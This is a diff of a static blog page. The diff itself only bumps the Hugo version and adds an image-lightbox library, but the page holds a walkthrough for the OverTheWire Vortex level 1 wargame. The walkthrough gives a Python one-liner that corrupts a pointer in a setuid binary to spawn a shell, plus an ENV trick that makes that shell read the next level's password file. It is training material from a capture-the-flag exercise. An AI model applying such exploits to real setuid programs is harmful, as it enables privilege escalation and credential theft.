@@ -26,7 +26,7 @@
 
 
 
-<meta name="generator" content="Hugo 0.75.1" />
+<meta name="generator" content="Hugo 0.89.4" />
 
 <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
 <style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
@@ -42,6 +42,10 @@
 <link href='https://blog.dornea.nu/css/styles.css' rel="stylesheet">
 <link rel="stylesheet" href="https://blog.dornea.nu/css/custom.css">
 
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox/dist/css/glightbox.min.css" />
+<script src="https://cdn.jsdelivr.net/gh/mcstudios/glightbox/dist/js/glightbox.min.js"></script>
 
 
 <link rel="icon" 
@@ -86,7 +90,7 @@ type="image/x-icon"/>
     
   </p>
   <div class="lh-copy post-content"><p>Solution for <a href="http://www.overthewire.org/wargames/vortex/vortex1.shtml">http://www.overthewire.org/wargames/vortex/vortex1.shtml</a>. Here&rsquo;s the code they have used:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> 
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> 
 <span style="color:#cd2828;font-weight:bold">#include </span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> 
 <span style="color:#cd2828;font-weight:bold">#include</span><span style="color:#cd2828;font-weight:bold">
@@ -118,7 +122,7 @@ type="image/x-icon"/>
         printf(<span style="color:#ed9d13">&#34;All done</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
 }
 </code></pre></div><p>The executable was at /<strong>vortex</strong>/vortex1:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ls -l /vortex/vortex1
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ls -l /vortex/vortex1
 -r-sr-x--- 1 vortex2 vortex1 7398 2011-11-13 23:07 /vortex/vortex1
 </code></pre></div><p>I hope you have noticed the SETUID-Bit which belongs to user vortex2. So that programm will run as vortex2. The password we need to find out is at /etc/vortex_pass/vortex2. Now let’s analyze the code&hellip;</p>
 <ul>
@@ -126,17 +130,17 @@ type="image/x-icon"/>
 <li>Everytime &ldquo;&quot;&rdquo; is read in, <code>ptr</code> is decremented. So we need to set ptr to the beginning of <code>buf</code>&rsquo;s address</li>
 <li><code>e()</code> is a macro which checks if <code>*ptr = 0xCA</code>. If this is true, then an &ldquo;interactive shell will be launched. This is what I did:</li>
 </ul>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ python -c &#39;print &#34;\\&#34;*257 + &#34;\xca&#34; + &#34;XXX&#34;&#39; | /vortex/vortex1 
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ python -c &#39;print &#34;\\&#34;*257 + &#34;\xca&#34; + &#34;XXX&#34;&#39; | /vortex/vortex1 
 $ 
 </code></pre></div><p>Nothing happens. We need to execute the new process (/bin/sh) with some &ldquo;extra arguments&rdquo;. I have created following script:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat script.sh 
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat script.sh 
 cat /etc/vortex_pass/vortex2
 </code></pre></div><p>&hellip;then as the bash manual states:</p>
 <blockquote>
 <p>&ldquo;When invoked as an interactive shell with the name sh, bash looks for the variable ENV, expands its value if it is defined, and uses the expanded value as the name of a file to read and execute&rdquo;</p>
 </blockquote>
 <p>We&rsquo;ll need to set the ENV variable properly and we&rsquo;re done:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ python -c &#39;print &#34;\\&#34;*257 + &#34;\xca&#34; + &#34;XXX&#34;&#39; | env ENV=/tmp/****/script.sh /vortex/vortex1 
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ python -c &#39;print &#34;\\&#34;*257 + &#34;\xca&#34; + &#34;XXX&#34;&#39; | env ENV=/tmp/****/script.sh /vortex/vortex1 
 ******
 $ 
 </code></pre></div></div>
@@ -244,6 +248,13 @@ function topFunction() {
 
 
 
+
+
+<script>
+ var glightbox = GLightbox({
+     selector: '.glightbox'
+ });
+</script>
 
   
 </body>
